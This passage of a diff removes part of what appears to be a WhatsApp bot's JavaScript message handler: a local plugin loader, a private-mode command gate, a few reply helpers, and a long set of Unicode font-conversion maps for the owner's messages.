-if(timee < "05:00:00"){
-var waktuucapan = 'Early Morning'
-}
-if(timee < "03:00:00"){
-var waktuucapan = 'Midnight'
-}
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Plugin Connector
-const loadPlugins = (directory) => {
-    let plugins = []
-    const folders = fs.readdirSync(directory)
-    folders.forEach(folder => {
-        const folderPath = path.join(directory, folder)
-        if (fs.lstatSync(folderPath).isDirectory()) {
-            const files = fs.readdirSync(folderPath)
-            files.forEach(file => {
-                const filePath = path.join(folderPath, file)
-                if (filePath.endsWith(".js")) {
-                    try {
-                        delete require.cache[require.resolve(filePath)]
-                        const plugin = require(filePath)
-                        plugin.filePath = filePath
-                        plugins.push(plugin)
-                    } catch (error) {
-                        console.error(`Error loading plugin at ${filePath}:`, error)
-                    }
-                }
-            })
-        }
-    })
-    return plugins
-}
-const plugins = loadPlugins(path.resolve(__dirname, "./plugin"))
-const context = { 
-    args, 
-    X, 
-    reply,
-    m, 
-    body,   
-    prefix,
-    command,
-    isUrl,
-    q,
-    text,
-    quoted,
-    require,
-    smsg,
-    sleep,
-    clockString,
-    msToDate,
-    runtime,
-    fetchJson,
-    getBuffer,
-    delay,
-    getRandom
-     }
-let handled = false
-for (const plugin of plugins) {
-    if (plugin.command.includes(command)) {
-        try {
-            await plugin.operate(context)
-            handled = true
-        } catch (error) {
-            console.error(`Error executing plugin ${plugin.filePath}:`, error)
-        }
-        break
-    }
-}
-// Batas Plugins
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// tag owner reaction
-if (m.isGroup) {
-    if (body.includes(`@${owner}`)) {
-        await X.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
-    }
- }
-// tes bot no prefix
-if ((budy.match) && ["bot",].includes(budy) && !isCmd) {
-reply(`╔══════════════════════════╗\n║  🟢 *ONLINE & READY*\n╚══════════════════════════╝\n\n  ├ 🤖 *${global.botname || 'TOOSII-XD ULTRA'}*\n  └ ⏱️  *Uptime* › ${runtime(process.uptime())}`)
-}       
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Mode Gate
-// Private mode: ONLY the deployed bot number can use any command
-// Public mode:  All users can use non-owner commands normally
-const isDeployedNumber = m.key.fromMe || senderClean === botClean
-
-if (isCmd && X.public === false && !isDeployedNumber) {
-    return reply('🔒 *Bot is in Private Mode.*\n_Only the bot owner can use commands._')
-}
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Owner Font Mode — auto-converts every message the bot owner sends
-// Activated via .setfont [fontname], deactivated via .fontoff
-if (m.key.fromMe && global.ownerFontMode && global.ownerFontMode !== 'off' && budy && !isCmd) {
-    try {
-        const _fontMaps = {
-            bold:          {a:'𝗮',b:'𝗯',c:'𝗰',d:'𝗱',e:'𝗲',f:'𝗳',g:'𝗴',h:'𝗵',i:'𝗶',j:'𝗷',k:'𝗸',l:'𝗹',m:'𝗺',n:'𝗻',o:'𝗼',p:'𝗽',q:'𝗾',r:'𝗿',s:'𝘀',t:'𝘁',u:'𝘂',v:'𝘃',w:'𝘄',x:'𝘅',y:'𝘆',z:'𝘇',A:'𝗔',B:'𝗕',C:'𝗖',D:'𝗗',E:'𝗘',F:'𝗙',G:'𝗚',H:'𝗛',I:'𝗜',J:'𝗝',K:'𝗞',L:'𝗟',M:'𝗠',N:'𝗡',O:'𝗢',P:'𝗣',Q:'𝗤',R:'𝗥',S:'𝗦',T:'𝗧',U:'𝗨',V:'𝗩',W:'𝗪',X:'𝗫',Y:'𝗬',Z:'𝗭','0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'},
-            italic:        {a:'𝘢',b:'𝘣',c:'𝘤',d:'𝘥',e:'𝘦',f:'𝘧',g:'𝘨',h:'𝘩',i:'𝘪',j:'𝘫',k:'𝘬',l:'𝘭',m:'𝘮',n:'𝘯',o:'𝘰',p:'𝘱',q:'𝘲',r:'𝘳',s:'𝘴',t:'𝘵',u:'𝘶',v:'𝘷',w:'𝘸',x:'𝘹',y:'𝘺',z:'𝘻',A:'𝘈',B:'𝘉',C:'𝘊',D:'𝘋',E:'𝘌',F:'𝘍',G:'𝘎',H:'𝘏',I:'𝘐',J:'𝘑',K:'𝘒',L:'𝘓',M:'𝘔',N:'𝘕',O:'𝘖',P:'𝘗',Q:'𝘘',R:'𝘙',S:'𝘚',T:'𝘛',U:'𝘜',V:'𝘝',W:'𝘞',X:'𝘟',Y:'𝘠',Z:'𝘡'},
-            bolditalic:    {a:'𝙖',b:'𝙗',c:'𝙘',d:'𝙙',e:'𝙚',f:'𝙛',g:'𝙜',h:'𝙝',i:'𝙞',j:'𝙟',k:'𝙠',l:'𝙡',m:'𝙢',n:'𝙣',o:'𝙤',p:'𝙥',q:'𝙦',r:'𝙧',s:'𝙨',t:'𝙩',u:'𝙪',v:'𝙫',w:'𝙬',x:'𝙭',y:'𝙮',z:'𝙯',A:'𝘼',B:'𝘽',C:'𝘾',D:'𝘿',E:'𝙀',F:'𝙁',G:'𝙂',H:'𝙃',I:'𝙄',J:'𝙅',K:'𝙆',L:'𝙇',M:'𝙈',N:'𝙉',O:'𝙊',P:'𝙋',Q:'𝙌',R:'𝙍',S:'𝙎',T:'𝙏',U:'𝙐',V:'𝙑',W:'𝙒',X:'𝙓',Y:'𝙔',Z:'𝙕'},
-            mono:          {a:'𝚊',b:'𝚋',c:'𝚌',d:'𝚍',e:'𝚎',f:'𝚏',g:'𝚐',h:'𝚑',i:'𝚒',j:'𝚓',k:'𝚔',l:'𝚕',m:'𝚖',n:'𝚗',o:'𝚘',p:'𝚙',q:'𝚚',r:'𝚛',s:'𝚜',t:'𝚝',u:'𝚞',v:'𝚟',w:'𝚠',x:'𝚡',y:'𝚢',z:'𝚣',A:'𝙰',B:'𝙱',C:'𝙲',D:'𝙳',E:'𝙴',F:'𝙵',G:'𝙶',H:'𝙷',I:'𝙸',J:'𝙹',K:'𝙺',L:'𝙻',M:'𝙼',N:'𝙽',O:'𝙾',P:'𝙿',Q:'𝚀',R:'𝚁',S:'𝚂',T:'𝚃',U:'𝚄',V:'𝚅',W:'𝚆',X:'𝚇',Y:'𝚈',Z:'𝚉','0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿'},
-            serif:         {a:'𝐚',b:'𝐛',c:'𝐜',d:'𝐝',e:'𝐞',f:'𝐟',g:'𝐠',h:'𝐡',i:'𝐢',j:'𝐣',k:'𝐤',l:'𝐥',m:'𝐦',n:'𝐧',o:'𝐨',p:'𝐩',q:'𝐪',r:'𝐫',s:'𝐬',t:'𝐭',u:'𝐮',v:'𝐯',w:'𝐰',x:'𝐱',y:'𝐲',z:'𝐳',A:'𝐀',B:'𝐁',C:'𝐂',D:'𝐃',E:'𝐄',F:'𝐅',G:'𝐆',H:'𝐇',I:'𝐈',J:'𝐉',K:'𝐊',L:'𝐋',M:'𝐌',N:'𝐍',O:'𝐎',P:'𝐏',Q:'𝐐',R:'𝐑',S:'𝐒',T:'𝐓',U:'𝐔',V:'𝐕',W:'𝐖',X:'𝐗',Y:'𝐘',Z:'𝐙','0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
-            serifbold:     {a:'𝒂',b:'𝒃',c:'𝒄',d:'𝒅',e:'𝒆',f:'𝒇',g:'𝒈',h:'𝒉',i:'𝒊',j:'𝒋',k:'𝒌',l:'𝒍',m:'𝒎',n:'𝒏',o:'𝒐',p:'𝒑',q:'𝒒',r:'𝒓',s:'𝒔',t:'𝒕',u:'𝒖',v:'𝒗',w:'𝒘',x:'𝒙',y:'𝒚',z:'𝒛',A:'𝑨',B:'𝑩',C:'𝑪',D:'𝑫',E:'𝑬',F:'𝑭',G:'𝑮',H:'𝑯',I:'𝑰',J:'𝑱',K:'𝑲',L:'𝑳',M:'𝑴',N:'𝑵',O:'𝑶',P:'𝑷',Q:'𝑸',R:'𝑹',S:'𝑺',T:'𝑻',U:'𝑼',V:'𝑽',W:'𝑾',X:'𝑿',Y:'𝒀',Z:'𝒁'},
-            serifitalic:   {a:'𝑎',b:'𝑏',c:'𝑐',d:'𝑑',e:'𝑒',f:'𝑓',g:'𝑔',h:'ℎ',i:'𝑖',j:'𝑗',k:'𝑘',l:'𝑙',m:'𝑚',n:'𝑛',o:'𝑜',p:'𝑝',q:'𝑞',r:'𝑟',s:'𝑠',t:'𝑡',u:'𝑢',v:'𝑣',w:'𝑤',x:'𝑥',y:'𝑦',z:'𝑧',A:'𝐴',B:'𝐵',C:'𝐶',D:'𝐷',E:'𝐸',F:'𝐹',G:'𝐺',H:'𝐻',I:'𝐼',J:'𝐽',K:'𝐾',L:'𝐿',M:'𝑀',N:'𝑁',O:'𝑂',P:'𝑃',Q:'𝑄',R:'𝑅',S:'𝑆',T:'𝑇',U:'𝑈',V:'𝑉',W:'𝑊',X:'𝑋',Y:'𝑌',Z:'𝑍'},
-            scriptfont:    {a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'},
-            scriptbold:    {a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩'},
-            fraktur:       {a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔤',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝔩',m:'𝔪',n:'𝔫',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',A:'𝔄',B:'𝔅',C:'ℭ',D:'𝔇',E:'𝔈',F:'𝔉',G:'𝔊',H:'ℌ',I:'ℑ',J:'𝔍',K:'𝔎',L:'𝔏',M:'𝔐',N:'𝔑',O:'𝔒',P:'𝔓',Q:'𝔔',R:'ℜ',S:'𝔖',T:'𝔗',U:'𝔘',V:'𝔙',W:'𝔚',X:'𝔛',Y:'𝔜',Z:'ℨ'},
-            frakturbold:   {a:'𝖆',b:'𝖇',c:'𝖈',d:'𝖉',e:'𝖊',f:'𝖋',g:'𝖌',h:'𝖍',i:'𝖎',j:'𝖏',k:'𝖐',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝖔',p:'𝖕',q:'𝖖',r:'𝖗',s:'𝖘',t:'𝖙',u:'𝖚',v:'𝖛',w:'𝖜',x:'𝖝',y:'𝖞',z:'𝖟',A:'𝕬',B:'𝕭',C:'𝕮',D:'𝕯',E:'𝕰',F:'𝕱',G:'𝕲',H:'𝕳',I:'𝕴',J:'𝕵',K:'𝕶',L:'𝕷',M:'𝕸',N:'𝕹',O:'𝕺',P:'𝕻',Q:'𝕼',R:'𝕽',S:'𝕾',T:'𝕿',U:'𝖀',V:'𝖁',W:'𝖂',X:'𝖃',Y:'𝖄',Z:'𝖅'},
-            doublestruck:  {a:'𝕒',b:'𝕓',c:'𝕔',d:'𝕕',e:'𝕖',f:'𝕗',g:'𝕘',h:'𝕙',i:'𝕚',j:'𝕛',k:'𝕜',l:'𝕝',m:'𝕞',n:'𝕟',o:'𝕠',p:'𝕡',q:'𝕢',r:'𝕣',s:'𝕤',t:'𝕥',u:'𝕦',v:'𝕧',w:'𝕨',x:'𝕩',y:'𝕪',z:'𝕫',A:'𝔸',B:'𝔹',C:'ℂ',D:'𝔻',E:'𝔼',F:'𝔽',G:'𝔾',H:'ℍ',I:'𝕀',J:'𝕁',K:'𝕂',L:'𝕃',M:'𝕄',N:'ℕ',O:'𝕆',P:'ℙ',Q:'ℚ',R:'ℝ',S:'𝕊',T:'𝕋',U:'𝕌',V:'𝕍',W:'𝕎',X:'𝕏',Y:'𝕐',Z:'ℤ','0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'},
-            smallcaps:     {a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ꜰ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',n:'ɴ',o:'ᴏ',p:'ᴘ',q:'Q',r:'ʀ',s:'ꜱ',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ',A:'ᴀ',B:'ʙ',C:'ᴄ',D:'ᴅ',E:'ᴇ',F:'ꜰ',G:'ɢ',H:'ʜ',I:'ɪ',J:'ᴊ',K:'ᴋ',L:'ʟ',M:'ᴍ',N:'ɴ',O:'ᴏ',P:'ᴘ',Q:'Q',R:'ʀ',S:'ꜱ',T:'ᴛ',U:'ᴜ',V:'ᴠ',W:'ᴡ',X:'x',Y:'ʏ',Z:'ᴢ'},
-            bubble:        {a:'ⓐ',b:'ⓑ',c:'ⓒ',d:'ⓓ',e:'ⓔ',f:'ⓕ',g:'ⓖ',h:'ⓗ',i:'ⓘ',j:'ⓙ',k:'ⓚ',l:'ⓛ',m:'ⓜ',n:'ⓝ',o:'ⓞ',p:'ⓟ',q:'ⓠ',r:'ⓡ',s:'ⓢ',t:'ⓣ',u:'ⓤ',v:'ⓥ',w:'ⓦ',x:'ⓧ',y:'ⓨ',z:'ⓩ',A:'Ⓐ',B:'Ⓑ',C:'Ⓒ',D:'Ⓓ',E:'Ⓔ',F:'Ⓕ',G:'Ⓖ',H:'Ⓗ',I:'Ⓘ',J:'Ⓙ',K:'Ⓚ',L:'Ⓛ',M:'Ⓜ',N:'Ⓝ',O:'Ⓞ',P:'Ⓟ',Q:'Ⓠ',R:'Ⓡ',S:'Ⓢ',T:'Ⓣ',U:'Ⓤ',V:'Ⓥ',W:'Ⓦ',X:'Ⓧ',Y:'Ⓨ',Z:'Ⓩ','0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨'},
-            bubblebold:    {a:'🅐',b:'🅑',c:'🅒',d:'🅓',e:'🅔',f:'🅕',g:'🅖',h:'🅗',i:'🅘',j:'🅙',k:'🅚',l:'🅛',m:'🅜',n:'🅝',o:'🅞',p:'🅟',q:'🅠',r:'🅡',s:'🅢',t:'🅣',u:'🅤',v:'🅥',w:'🅦',x:'🅧',y:'🅨',z:'🅩',A:'🅐',B:'🅑',C:'🅒',D:'🅓',E:'🅔',F:'🅕',G:'🅖',H:'🅗',I:'🅘',J:'🅙',K:'🅚',L:'🅛',M:'🅜',N:'🅝',O:'🅞',P:'🅟',Q:'🅠',R:'🅡',S:'🅢',T:'🅣',U:'🅤',V:'🅥',W:'🅦',X:'🅧',Y:'🅨',Z:'🅩'},
-            square:        {a:'🄰',b:'🄱',c:'🄲',d:'🄳',e:'🄴',f:'🄵',g:'🄶',h:'🄷',i:'🄸',j:'🄹',k:'🄺',l:'🄻',m:'🄼',n:'🄽',o:'🄾',p:'🄿',q:'🅀',r:'🅁',s:'🅂',t:'🅃',u:'🅄',v:'🅅',w:'🅆',x:'🅇',y:'🅈',z:'🅉',A:'🄰',B:'🄱',C:'🄲',D:'🄳',E:'🄴',F:'🄵',G:'🄶',H:'🄷',I:'🄸',J:'🄹',K:'🄺',L:'🄻',M:'🄼',N:'🄽',O:'🄾',P:'🄿',Q:'🅀',R:'🅁',S:'🅂',T:'🅃',U:'🅄',V:'🅅',W:'🅆',X:'🅇',Y:'🅈',Z:'🅉'},
-            squarebold:    {a:'🅰',b:'🅱',c:'🅲',d:'🅳',e:'🅴',f:'🅵',g:'🅶',h:'🅷',i:'🅸',j:'🅹',k:'🅺',l:'🅻',m:'🅼',n:'🅽',o:'🅾',p:'🅿',q:'🆀',r:'🆁',s:'🆂',t:'🆃',u:'🆄',v:'🆅',w:'🆆',x:'🆇',y:'🆈',z:'🆉',A:'🅰',B:'🅱',C:'🅲',D:'🅳',E:'🅴',F:'🅵',G:'🅶',H:'🅷',I:'🅸',J:'🅹',K:'🅺',L:'🅻',M:'🅼',N:'🅽',O:'🅾',P:'🅿',Q:'🆀',R:'🆁',S:'🆂',T:'🆃',U:'🆄',V:'🆅',W:'🆆',X:'🆇',Y:'🆈',Z:'🆉'},
-            wide:          'wide',
-            upsidedown:    'upsidedown',
-            strikethrough: 'strikethrough',
-            underline:     'underline',
-            medieval:      {a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔤',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝔩',m:'𝔪',n:'𝔫',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',A:'𝔄',B:'𝔅',C:'ℭ',D:'𝔇',E:'𝔈',F:'𝔉',G:'𝔊',H:'ℌ',I:'ℑ',J:'𝔍',K:'𝔎',L:'𝔏',M:'𝔐',N:'𝔑',O:'𝔒',P:'𝔓',Q:'𝔔',R:'ℜ',S:'𝔖',T:'𝔗',U:'𝔘',V:'𝔙',W:'𝔚',X:'𝔛',Y:'𝔜',Z:'ℨ'},
-            cursive:       {a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩'},
-            aesthetic:     {a:'ａ',b:'ｂ',c:'ｃ',d:'ｄ',e:'ｅ',f:'ｆ',g:'ｇ',h:'ｈ',i:'ｉ',j:'ｊ',k:'ｋ',l:'ｌ',m:'ｍ',n:'ｎ',o:'ｏ',p:'ｐ',q:'ｑ',r:'ｒ',s:'ｓ',t:'ｔ',u:'ｕ',v:'ｖ',w:'ｗ',x:'ｘ',y:'ｙ',z:'ｚ',A:'Ａ',B:'Ｂ',C:'Ｃ',D:'Ｄ',E:'Ｅ',F:'Ｆ',G:'Ｇ',H:'Ｈ',I:'Ｉ',J:'Ｊ',K:'Ｋ',L:'Ｌ',M:'Ｍ',N:'Ｎ',O:'Ｏ',P:'Ｐ',Q:'Ｑ',R:'Ｒ',S:'Ｓ',T:'Ｔ',U:'Ｕ',V:'Ｖ',W:'Ｗ',X:'Ｘ',Y:'Ｙ',Z:'Ｚ','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'},
-            tiny:          {a:'ᵃ',b:'ᵇ',c:'ᶜ',d:'ᵈ',e:'ᵉ',f:'ᶠ',g:'ᵍ',h:'ʰ',i:'ⁱ',j:'ʲ',k:'ᵏ',l:'ˡ',m:'ᵐ',n:'ⁿ',o:'ᵒ',p:'ᵖ',q:'q',r:'ʳ',s:'ˢ',t:'ᵗ',u:'ᵘ',v:'ᵛ',w:'ʷ',x:'ˣ',y:'ʸ',z:'ᶻ',A:'ᴬ',B:'ᴮ',C:'ᶜ',D:'ᴰ',E:'ᴱ',F:'ᶠ',G:'ᴳ',H:'ᴴ',I:'ᴵ',J:'ᴶ',K:'ᴷ',L:'ᴸ',M:'ᴹ',N:'ᴺ',O:'ᴼ',P:'ᴾ',Q:'Q',R:'ᴿ',S:'ˢ',T:'ᵀ',U:'ᵁ',V:'ᵛ',W:'ᵂ',X:'ˣ',Y:'ʸ',Z:'ᶻ'},
-            gothic:        {a:'𝖆',b:'𝖇',c:'𝖈',d:'𝖉',e:'𝖊',f:'𝖋',g:'𝖌',h:'𝖍',i:'𝖎',j:'𝖏',k:'𝖐',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝖔',p:'𝖕',q:'𝖖',r:'𝖗',s:'𝖘',t:'𝖙',u:'𝖚',v:'𝖛',w:'𝖜',x:'𝖝',y:'𝖞',z:'𝖟',A:'𝕬',B:'𝕭',C:'𝕮',D:'𝕯',E:'𝕰',F:'𝕱',G:'𝕲',H:'𝕳',I:'𝕴',J:'𝕵',K:'𝕶',L:'𝕷',M:'𝕸',N:'𝕹',O:'𝕺',P:'𝕻',Q:'𝕼',R:'𝕽',S:'𝕾',T:'𝕿',U:'𝖀',V:'𝖁',W:'𝖂',X:'𝖃',Y:'𝖄',Z:'𝖅'},
-            inverted:      {a:'ɐ',b:'q',c:'ɔ',d:'p',e:'ǝ',f:'ɟ',g:'ƃ',h:'ɥ',i:'ᴉ',j:'ɾ',k:'ʞ',l:'l',m:'ɯ',n:'u',o:'o',p:'d',q:'b',r:'ɹ',s:'s',t:'ʇ',u:'n',v:'ʌ',w:'ʍ',x:'x',y:'ʎ',z:'z',A:'∀',B:'q',C:'Ɔ',D:'p',E:'Ǝ',F:'Ⅎ',G:'פ',H:'H',I:'I',J:'ɾ',K:'ʞ',L:'˥',M:'W',N:'N',O:'O',P:'Ԁ',Q:'Q',R:'ɹ',S:'S',T:'┴',U:'∩',V:'Λ',W:'M',X:'X',Y:'ʎ',Z:'Z'},
-            mirror:        {a:'ɒ',b:'d',c:'ɔ',d:'b',e:'ɘ',f:'ʇ',g:'ϱ',h:'ʜ',i:'i',j:'ᴉ',k:'ʞ',l:'l',m:'m',n:'n',o:'o',p:'q',q:'p',r:'ɿ',s:'ƨ',t:'ƚ',u:'u',v:'v',w:'w',x:'x',y:'y',z:'z',A:'A',B:'ᗺ',C:'Ɔ',D:'ᗡ',E:'Ǝ',F:'ꟻ',G:'Ꭾ',H:'H',I:'I',J:'Ꮈ',K:'ꓘ',L:'⅃',M:'M',N:'И',O:'O',P:'ꟼ',Q:'Ọ',R:'Я',S:'Ƨ',T:'T',U:'U',V:'V',W:'W',X:'X',Y:'Y',Z:'Z'},
-            currency:      {a:'₳',b:'฿',c:'₵',d:'₫',e:'€',f:'₣',g:'₲',h:'♄',i:'ł',j:'ʝ',k:'₭',l:'₤',m:'₥',n:'₦',o:'ø',p:'₱',q:'q',r:'®',s:'$',t:'₮',u:'µ',v:'√',w:'₩',x:'×',y:'¥',z:'z',A:'₳',B:'฿',C:'₵',D:'₫',E:'€',F:'₣',G:'₲',H:'♄',I:'ł',J:'ʝ',K:'₭',L:'₤',M:'₥',N:'₦',O:'ø',P:'₱',Q:'Q',R:'®',S:'$',T:'₮',U:'µ',V:'√',W:'₩',X:'×',Y:'¥',Z:'Z'},
-            dotted:        {a:'ȧ',b:'ḃ',c:'ċ',d:'ḋ',e:'ė',f:'ḟ',g:'ġ',h:'ḣ',i:'ı',j:'j',k:'k',l:'l',m:'ṁ',n:'ṅ',o:'ȯ',p:'ṗ',q:'q',r:'ṙ',s:'ṡ',t:'ṫ',u:'u',v:'v',w:'ẇ',x:'ẋ',y:'ẏ',z:'ż',A:'Ȧ',B:'Ḃ',C:'Ċ',D:'Ḋ',E:'Ė',F:'Ḟ',G:'Ġ',H:'Ḣ',I:'İ',J:'J',K:'K',L:'L',M:'Ṁ',N:'Ṅ',O:'Ȯ',P:'Ṗ',Q:'Q',R:'Ṙ',S:'Ṡ',T:'Ṫ',U:'U',V:'V',W:'Ẇ',X:'Ẋ',Y:'Ẏ',Z:'Ż'},
-            oldeng:        {a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'},
-            parenthesis:   {a:'⒜',b:'⒝',c:'⒞',d:'⒟',e:'⒠',f:'⒡',g:'⒢',h:'⒣',i:'⒤',j:'⒥',k:'⒦',l:'⒧',m:'⒨',n:'⒩',o:'⒪',p:'⒫',q:'⒬',r:'⒭',s:'⒮',t:'⒯',u:'⒰',v:'⒱',w:'⒲',x:'⒳',y:'⒴',z:'⒵',A:'⒜',B:'⒝',C:'⒞',D:'⒟',E:'⒠',F:'⒡',G:'⒢',H:'⒣',I:'⒤',J:'⒥',K:'⒦',L:'⒧',M:'⒨',N:'⒩',O:'⒪',P:'⒫',Q:'⒬',R:'⒭',S:'⒮',T:'⒯',U:'⒰',V:'⒱',W:'⒲',X:'⒳',Y:'⒴',Z:'⒵'},
-            flags:         {a:'🇦',b:'🇧',c:'🇨',d:'🇩',e:'🇪',f:'🇫',g:'🇬',h:'🇭',i:'🇮',j:'🇯',k:'🇰',l:'🇱',m:'🇲',n:'🇳',o:'🇴',p:'🇵',q:'🇶',r:'🇷',s:'🇸',t:'🇹',u:'🇺',v:'🇻',w:'🇼',x:'🇽',y:'🇾',z:'🇿',A:'🇦',B:'🇧',C:'🇨',D:'🇩',E:'🇪',F:'🇫',G:'🇬',H:'🇭',I:'🇮',J:'🇯',K:'🇰',L:'🇱',M:'🇲',N:'🇳',O:'🇴',P:'🇵',Q:'🇶',R:'🇷',S:'🇸',T:'🇹',U:'🇺',V:'🇻',W:'🇼',X:'🇽',Y:'🇾',Z:'🇿'},
-            medieval:      {a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔤',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝔩',m:'𝔪',n:'𝔫',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',A:'𝔄',B:'𝔅',C:'ℭ',D:'𝔇',E:'𝔈',F:'𝔉',G:'𝔊',H:'ℌ',I:'ℑ',J:'𝔍',K:'𝔎',L:'𝔏',M:'𝔐',N:'𝔑',O:'𝔒',P:'𝔓',Q:'𝔔',R:'ℜ',S:'𝔖',T:'𝔗',U:'𝔘',V:'𝔙',W:'𝔚',X:'𝔛',Y:'𝔜',Z:'ℨ'},
-            cursive:       {a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩'},
